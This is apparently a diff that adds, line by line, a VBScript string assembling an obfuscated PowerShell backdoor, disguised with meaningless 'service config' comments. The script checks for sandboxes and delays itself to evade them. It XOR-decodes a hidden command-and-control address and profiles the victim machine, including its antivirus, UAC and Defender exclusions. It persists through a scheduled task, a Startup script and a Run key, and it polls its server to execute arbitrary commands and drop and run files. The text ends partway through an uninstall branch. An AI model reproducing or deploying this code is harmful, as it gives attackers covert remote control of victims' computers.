+        "EVwOwCgnDYG4 = \"# initialize service config\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function GBH1c77p {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $e5T3JV7 = 81975\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $MxW6 = 66798\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $VsbMT3 = 36723\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return $e5T3JV7\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function kicwjFza {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $TypW8q = 69098\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $FUM1PqDx = 93840\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $LnBE = 80942\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return $TypW8q\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function LClR6cTgi {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $tby0NbPZ = 8775\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $L8Qlg = 94261\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return $tby0NbPZ\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# execute validate\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$AFSNq7 = Get-Random -Minimum 5 -Maximum 14\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Start-Sleep -Seconds $AFSNq7\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# process system service handler\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$Y5jGeeD = [System.Environment]::ProcessorCount\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$Wlzqp = [System.Environment]::OSVersion.VersionString\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$QzKiorc = (Get-Date).ToString('yyyy-MM-dd')\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$B8uMT = [System.IO.Path]::GetTempPath()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$DLHwSPYm = [System.Environment]::MachineName\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# service system component component\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$wsgFzxP = (Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$UTd7r = [System.Environment]::ProcessorCount\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"if ($wsgFzxP -and $wsgFzxP -lt 2147483648) { Start-Sleep -Seconds (Get-Random -Minimum 112 -Maximum 205) }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"if ($UTd7r -and $UTd7r -lt 2) { Start-Sleep -Seconds (Get-Random -Minimum 112 -Maximum 205) }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# component component config validate\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function E1FCRgUg4DGzdG($d, $k) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $b = [System.Convert]::FromBase64String($d)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $r = @()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    for ($i = 0; $i -lt $b.Length; $i++) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $r += [char]($b[$i] -bxor $k)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return -join $r\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# component component\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$KeUh7kY = E1FCRgUg4DGzdG 'Tk1URwxMR0VQTQxLTEk=' 34\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$jJRu_uJ = E1FCRgUg4DGzdG '7+bi5Q==' 215\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$pcBhkKr = \"\"http://\"\" + $KeUh7kY + \"\":\"\" + $jJRu_uJ\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$AL8iC0afdHC = '|V|'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$YrifrlnW5 = '\\'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$rYlFs_gA9_c9 = $MyInvocation.MyCommand.Path\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# config system\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$M5g9tvfobZ67 = New-Object -ComObject WScript.Shell\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2500)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$aq2ltiqmd5 = New-Object -ComObject Scripting.FileSystemObject\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# component service handler execute\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Add-Type @'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"using System;\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"using System.Runtime.InteropServices;\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"using System.Text;\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"public class DQ5oYI {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    [DllImport(\"\"user32.dll\"\")] public static extern IntPtr GetForegroundWindow();\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    [DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    public static string GetActiveTitle() {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        IntPtr h = GetForegroundWindow();\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        if (h == IntPtr.Zero) return \"\"\"\";\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        StringBuilder sb = new StringBuilder(256);\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        GetWindowText(h, sb, 256);\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        return sb.ToString();\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"'@\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"} catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function owWiwfy1MbVeVi($S) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return $M5g9tvfobZ67.ExpandEnvironmentStrings(\"\"%$S%\"\")\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# validate initialize service\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$m2X3FFD = 'Windows'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $wmi = [WmiSearcher]'SELECT Caption FROM Win32_OperatingSystem'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $items = $wmi.Get()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    foreach ($item in $items) { $m2X3FFD = $item.Caption }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"} catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$boWq5ftHly = 'Windows Defender'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $avProd = Get-WmiObject -Namespace 'root\\SecurityCenter2' -Class AntiVirusProduct -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    if ($avProd) { $boWq5ftHly = $avProd.displayName }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"} catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$y3sD7kOAQ9 = '00000000'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $disk = Get-WmiObject Win32_LogicalDisk -Filter \"\"DeviceID='C:'\"\" -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    if ($disk) { $y3sD7kOAQ9 = $disk.VolumeSerialNumber }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"} catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$mUvmoUF = 'NO'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$vbcPath = (owWiwfy1MbVeVi 'Windir') + '\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"if ($aq2ltiqmd5.FileExists($vbcPath)) { $mUvmoUF = 'YES' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$H4kvMCW = owWiwfy1MbVeVi 'COMPUTERNAME'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$x7LJh0x49p = owWiwfy1MbVeVi 'USERNAME'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"$EXs20BEjgRaY = 'app_' + $y3sD7kOAQ9\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# validate system config module\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function EpEU7JTD {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $regPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $consent = (Get-ItemProperty -Path $regPath -Name 'ConsentPromptBehaviorAdmin' -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $prompt = (Get-ItemProperty -Path $regPath -Name 'PromptOnSecureDesktop' -ErrorAction SilentlyContinue).PromptOnSecureDesktop\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        if ($consent -eq 0 -and $prompt -eq 0) { return 'OK' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        return 'NO'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch { return 'NO' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# execute execute\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function J9pjiyCFPgqj {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $regPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $props = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        if ($props -and ($props.PSObject.Properties.Name -contains 'C:\\')) { return 'OK' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        return 'NO'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch { return 'NO' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function sRx9YLlf6jYxUz {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $t = [DQ5oYI]::GetActiveTitle()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        if ($t) { return $t } else { return '' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch { return '' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function ZK8l9PN4 {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $uacSt = EpEU7JTD\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $exclSt = J9pjiyCFPgqj\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    $aw = sRx9YLlf6jYxUz\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    return $EXs20BEjgRaY + $YrifrlnW5 + $H4kvMCW + $YrifrlnW5 + $x7LJh0x49p + $YrifrlnW5 + $m2X3FFD + $YrifrlnW5 + $boWq5ftHly + $YrifrlnW5 + $uacSt + $YrifrlnW5 + $mUvmoUF + $YrifrlnW5 + $exclSt + $YrifrlnW5 + $aw\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function MWErJykB($C, $A) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $X = New-Object -ComObject Microsoft.XMLHTTP\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $X.open('POST', $pcBhkKr + \"\"/\"\" + $C, $false)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $ua = ZK8l9PN4\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $X.setRequestHeader('User-Agent:', $ua)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $X.send($A)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        return $X.responseText\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch { return '' }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# component module\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"function mTVi30vDdZfa {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $taskAction = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\"\"' + $rYlFs_gA9_c9 + '\"\"\"\"'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $null = cmd /c ('schtasks /create /sc minute /mo 300 /tn \"\"zvmZwMxy\"\" /tr \"\"' + $taskAction + '\"\" /f') 2>&1\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $startup = [Environment]::GetFolderPath('Startup')\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $vbsPath = $startup + '\\terosRjfEZth.vbs'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $vbsContent = 'Set sh = CreateObject(\"\"WScript.Shell\"\")' + [char]13 + [char]10\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $vbsContent += 'sh.Run \"\"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\"\"' + $rYlFs_gA9_c9 + '\"\"\"\"\"\", 0, False'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        [System.IO.File]::WriteAllText($vbsPath, $vbsContent)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 6)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $runKey = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $runCmd = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\"\"' + $rYlFs_gA9_c9 + '\"\"\"\"'\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        Set-ItemProperty -Path $runKey -Name 'AmOtaOASxji' -Value $runCmd -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"mTVi30vDdZfa\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 12)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"# validate config execute\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"while ($true) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        $P = MWErJykB 'Vre' ''\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        if ($P) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            $P = $P -split [regex]::Escape($AL8iC0afdHC)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            \" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            if ($P[0] -eq 'Cl') { exit }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            \" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            if ($P[0] -eq 'Sc' -and $P.Count -ge 3) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    $s2 = (owWiwfy1MbVeVi 'temp') + '\\' + $P[2]\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    [IO.File]::WriteAllBytes($s2, [Convert]::FromBase64String($P[1]))\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    $M5g9tvfobZ67.Run($s2)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                } catch {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi = $aq2ltiqmd5.CreateTextFile($s2, $true)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi.Write($P[1])\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi.Close()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $M5g9tvfobZ67.Run($s2)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            \" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            if ($P[0] -eq 'Ex' -and $P.Count -ge 2) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                try { Invoke-Expression $P[1] } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            \" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            if ($P[0] -eq 'RF' -and $P.Count -ge 3) {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    $s2 = (owWiwfy1MbVeVi 'temp') + '\\' + $P[2]\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    [IO.File]::WriteAllBytes($s2, [Convert]::FromBase64String($P[1]))\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    $M5g9tvfobZ67.Run($s2)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                } catch {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi = $aq2ltiqmd5.CreateTextFile($s2, $true)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi.Write($P[1])\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $fi.Close()\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                        $M5g9tvfobZ67.Run($s2)\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            \" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            if ($P[0] -eq 'Un') {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                try {\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    cmd /c 'schtasks /delete /tn \"\"zvmZwMxy\"\" /f' 2>&1\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    $startup = [Environment]::GetFolderPath('Startup')\" & vbCrLf", 
